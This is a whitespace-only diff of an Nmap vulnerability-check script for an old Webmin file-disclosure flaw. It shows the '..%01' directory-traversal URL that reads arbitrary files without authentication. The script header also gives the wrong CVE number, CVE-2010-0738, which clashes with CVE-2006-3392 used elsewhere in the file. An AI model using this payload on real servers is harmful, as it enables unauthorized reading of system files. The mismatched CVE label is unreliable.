@@ -8,7 +8,7 @@ description = [[
 Exploits a file disclosure vulnerability in Webmin (CVE-2010-0738)
 
 Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
-This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences 
+This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
 to bypass the removal of "../" directory traversal sequences.
 ]]
 ---
@@ -18,14 +18,14 @@ to bypass the removal of "../" directory traversal sequences.
 -- @output
 -- PORT   STATE SERVICE REASON
 -- 10000/tcp open  webmin    syn-ack
--- | http-vuln-cve2006-3392: 
+-- | http-vuln-cve2006-3392:
 -- |   VULNERABLE:
 -- |   Webmin File Disclosure
 -- |     State: VULNERABLE (Exploitable)
 -- |     IDs:  CVE:CVE-2006-3392
 -- |     Description:
 -- |       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
--- |       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences 
+-- |       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
 -- |       to bypass the removal of "../" directory traversal sequences.
 -- |     Disclosure date: 2006
 -- |     Extra information:
@@ -52,7 +52,7 @@ action = function(host, port)
        IDS = {CVE = 'CVE-2006-3392'},
        description = [[
 Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
-This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences 
+This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
 to bypass the removal of "../" directory traversal sequences.
 ]],
        references = {
@@ -67,7 +67,7 @@ to bypass the removal of "../" directory traversal sequences.
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
   local url = "/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01" .. file_var
 
-  stdnse.debug1("Getting " .. file_var) 
+  stdnse.debug1("Getting " .. file_var)
 
   local detection_session = http.get(host, port, url)
 
